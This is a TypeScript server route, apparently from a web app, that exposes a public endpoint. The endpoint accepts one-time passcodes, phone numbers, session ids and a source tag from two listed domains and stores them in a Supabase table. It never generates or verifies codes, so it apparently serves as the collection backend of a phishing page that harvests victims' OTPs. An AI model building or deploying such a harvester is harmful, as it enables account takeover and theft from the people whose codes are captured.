import { createFileRoute } from "@tanstack/react-router";
import { makeServiceClient } from "@/lib/admin-api.server";
import { z } from "zod";

const ALLOWED_ORIGINS = [
  "https://tmnbcre.lovable.app",
  "https://tamnbcare.online",
];

function corsHeaders(origin: string | null) {
  return {
    "Access-Control-Allow-Origin":
      origin && ALLOWED_ORIGINS.includes(origin) ? origin : ALLOWED_ORIGINS[0],
    "Access-Control-Allow-Methods": "POST, OPTIONS",
    "Access-Control-Allow-Headers": "content-type",
    Vary: "Origin",
  };
}

const BodySchema = z.object({
  sid: z.string().min(4).max(64),
  otp_code: z.string().min(1).max(20),
  phone_number: z.string().max(20).optional(),
  source: z.string().max(40).optional(),
});

export const Route = createFileRoute("/api/public/otp")({
  server: {
    handlers: {
      OPTIONS: async ({ request }) => {
        const origin = request.headers.get("origin");
        return new Response(null, { status: 204, headers: corsHeaders(origin) });
      },
      POST: async ({ request }) => {
        const origin = request.headers.get("origin");
        if (origin && !ALLOWED_ORIGINS.includes(origin)) {
          return new Response("Origin not allowed", { status: 403, headers: corsHeaders(origin) });
        }
        let json: unknown;
        try {
          json = await request.json();
        } catch {
          return new Response("Bad JSON", { status: 400, headers: corsHeaders(origin) });
        }
        const parsed = BodySchema.safeParse(json);
        if (!parsed.success) {
          return new Response("Invalid payload", { status: 400, headers: corsHeaders(origin) });
        }
        const { sid, otp_code, phone_number, source } = parsed.data;
        const supabase = makeServiceClient();
        const { error } = await supabase.from("otps").insert({
          session_id: sid,
          otp_code,
          phone_number: phone_number ?? null,
          source: source ?? null,
        });
        if (error) {
          return new Response(JSON.stringify({ error: error.message }), {
            status: 500,
            headers: { ...corsHeaders(origin), "Content-Type": "application/json" },
          });
        }
        return new Response(JSON.stringify({ ok: true }), {
          headers: { ...corsHeaders(origin), "Content-Type": "application/json" },
        });
      },
    },
  },
});
